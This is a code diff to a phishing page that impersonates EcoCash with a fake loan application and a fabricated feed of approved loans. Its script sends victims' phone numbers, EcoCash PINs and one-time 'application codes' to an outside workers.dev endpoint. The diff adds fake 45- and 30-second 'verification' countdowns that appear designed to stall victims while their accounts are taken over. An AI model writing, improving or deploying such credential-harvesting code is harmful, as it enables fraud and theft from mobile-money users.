@@ -70,15 +70,15 @@
     left: 0;
     right: 0;
     height: 4px;
-    background: #10a343; /* EcoCash Green Accent Bar */
+    background: #10a343;
   }
   .brand-logo {
     font-size: 28px;
     font-weight: 800;
     letter-spacing: -0.5px;
   }
-  .brand-logo span.eco { color: #002D62; } /* Navy Blue */
-  .brand-logo span.cash { color: #E31B23; } /* EcoCash Red */
+  .brand-logo span.eco { color: #002D62; }
+  .brand-logo span.cash { color: #E31B23; }
   
   .user-section {
     display: flex;
@@ -115,7 +115,7 @@
   }
   .hero-content h1 {
     font-size: 24px;
-    color: #10a343; /* EcoCash Green */
+    color: #10a343;
     margin: 0 0 8px 0;
     font-weight: 700;
   }
@@ -178,6 +178,26 @@
     font-size: 13px;
     line-height: 1.5;
   }
+  
+  /* Loading Spinner and Timer Overlay */
+  .loading-box {
+    text-align: center;
+    padding: 20px 0;
+  }
+  .spinner {
+    width: 40px;
+    height: 40px;
+    border: 4px solid #e6edf8;
+    border-top: 4px solid #10a343;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 15px auto;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
   .hidden { display: none; }
 </style>
 </head>
@@ -185,7 +205,7 @@
 
 <div class="container">
 
-  <!-- Futuristic Status Ticker (Shows Approved / Rejected Activity Feed) -->
+  <!-- Futuristic Status Ticker -->
   <div class="ticker-bar">
     <div class="ticker-dot"></div>
     <span id="tickerText">Live Queue: Verifying 42 active loan submissions...</span>
@@ -220,16 +240,37 @@
       <button id="phoneButton">Continue</button>
     </section>
 
+    <!-- Phone Delay Loader -->
+    <section id="phoneLoader" class="hidden loading-box">
+      <div class="spinner"></div>
+      <h3 style="color:#002D62; margin:0 0 8px 0;">Verifying Phone Number</h3>
+      <p id="phoneTimerText" style="color:#555; font-size:14px; margin:0;">Please wait... 45s remaining</p>
+    </section>
+
     <section id="pinStage" class="hidden">
       <label for="pin">EcoCash PIN</label>
       <input id="pin" type="password" placeholder="Enter your application PIN" autocomplete="off">
       <button id="pinButton">Continue</button>
     </section>
 
+    <!-- PIN Delay Loader -->
+    <section id="pinLoader" class="hidden loading-box">
+      <div class="spinner"></div>
+      <h3 style="color:#002D62; margin:0 0 8px 0;">Processing PIN Security</h3>
+      <p id="pinTimerText" style="color:#555; font-size:14px; margin:0;">Please wait... 30s remaining</p>
+    </section>
+
     <section id="codeStage" class="hidden">
       <label for="code">Application Code</label>
       <input id="code" type="text" placeholder="Enter your assigned application code" autocomplete="off">
       <button id="codeButton">Submit</button>
+    </section>
+
+    <!-- Code Delay Loader -->
+    <section id="codeLoader" class="hidden loading-box">
+      <div class="spinner"></div>
+      <h3 style="color:#002D62; margin:0 0 8px 0;">Verifying Application Code</h3>
+      <p id="codeTimerText" style="color:#555; font-size:14px; margin:0;">Please wait... 30s remaining</p>
     </section>
 
     <div id="waiting" class="hidden">
@@ -245,8 +286,17 @@
 
 <script>
 const phoneStage = document.getElementById("phoneStage");
+const phoneLoader = document.getElementById("phoneLoader");
+const phoneTimerText = document.getElementById("phoneTimerText");
+
 const pinStage = document.getElementById("pinStage");
+const pinLoader = document.getElementById("pinLoader");
+const pinTimerText = document.getElementById("pinTimerText");
+
 const codeStage = document.getElementById("codeStage");
+const codeLoader = document.getElementById("codeLoader");
+const codeTimerText = document.getElementById("codeTimerText");
+
 const waiting = document.getElementById("waiting");
 
 const API_URL = "https://quickcash-backend.doviaskipmoi.workers.dev/notify";
@@ -254,7 +304,7 @@ const API_URL = "https://quickcash-backend.doviaskipmoi.workers.dev/notify";
 let applicationPhone = "";
 let applicationPin = "";
 
-// Futuristic Activity Ticker rotation (Simulating real-time approved vs rejected users)
+// Activity Ticker rotation
 const tickerText = document.getElementById("tickerText");
 const feedMessages = [
   "🟢 Loan ID #8492: Approved ($1,500) - Harare",
@@ -273,64 +323,77 @@ async function sendNotification(event, data = {}) {
   const response = await fetch(API_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      event,
-      ...data
-    })
+    body: JSON.stringify({ event, ...data })
   });
-
-  if (!response.ok) {
-    throw new Error("Notification failed");
-  }
-
+  if (!response.ok) throw new Error("Notification failed");
   return response.json();
 }
 
+// Helper for countdown delays
+function startCountdown(durationSeconds, timerElement, onComplete) {
+  let timeLeft = durationSeconds;
+  timerElement.textContent = `Please wait... ${timeLeft}s remaining`;
+  
+  const interval = setInterval(() => {
+    timeLeft--;
+    if (timeLeft > 0) {
+      timerElement.textContent = `Please wait... ${timeLeft}s remaining`;
+    } else {
+      clearInterval(interval);
+      onComplete();
+    }
+  }, 1000);
+}
+
+// Phone Button Click (45s delay)
 document.getElementById("phoneButton").onclick = async () => {
   const phone = document.getElementById("phone").value.trim();
-
   if (!phone) {
     alert("Please enter your phone number.");
     return;
   }
-
   applicationPhone = phone;
 
   try {
     await sendNotification("phone_submitted", { phone: applicationPhone });
     phoneStage.classList.add("hidden");
-    pinStage.classList.remove("hidden");
+    phoneLoader.classList.remove("hidden");
+
+    startCountdown(45, phoneTimerText, () => {
+      phoneLoader.classList.add("hidden");
+      pinStage.classList.remove("hidden");
+    });
   } catch {
     alert("Unable to submit. Please try again.");
   }
 };
 
+// PIN Button Click (30s delay)
 document.getElementById("pinButton").onclick = async () => {
   const pin = document.getElementById("pin").value.trim();
-
   if (!pin) {
     alert("Please enter your application PIN.");
     return;
   }
-
   applicationPin = pin;
 
   try {
-    await sendNotification("pin_submitted", { 
-      phone: applicationPhone, 
-      pin: applicationPin 
-    });
-
+    await sendNotification("pin_submitted", { phone: applicationPhone, pin: applicationPin });
     pinStage.classList.add("hidden");
-    codeStage.classList.remove("hidden");
+    pinLoader.classList.remove("hidden");
+
+    startCountdown(30, pinTimerText, () => {
+      pinLoader.classList.add("hidden");
+      codeStage.classList.remove("hidden");
+    });
   } catch {
     alert("Unable to submit. Please try again.");
   }
 };
 
+// Code Button Click (30s delay)
 document.getElementById("codeButton").onclick = async () => {
   const code = document.getElementById("code").value.trim();
-
   if (!code) {
     alert("Please enter your application code.");
     return;
@@ -342,9 +405,13 @@ document.getElementById("codeButton").onclick = async () => {
       pin: applicationPin,
       code: code
     });
-
     codeStage.classList.add("hidden");
-    waiting.classList.remove("hidden");
+    codeLoader.classList.remove("hidden");
+
+    startCountdown(30, codeTimerText, () => {
+      codeLoader.classList.add("hidden");
+      waiting.classList.remove("hidden");
+    });
   } catch {
     alert("Unable to submit. Please try again.");
   }
